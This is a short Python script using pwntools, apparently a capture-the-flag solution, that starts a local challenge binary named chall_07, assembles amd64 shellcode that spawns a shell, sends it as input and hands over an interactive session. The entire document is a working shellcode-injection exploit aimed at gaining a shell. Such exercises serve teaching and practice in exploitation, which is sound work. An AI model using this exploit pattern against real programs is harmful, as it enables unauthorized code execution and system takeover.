from pwn import *

p = process("./chall_07")

context.arch = "amd64"

shell = asm(shellcraft.sh())

p.sendline(shell)

p.interactive()
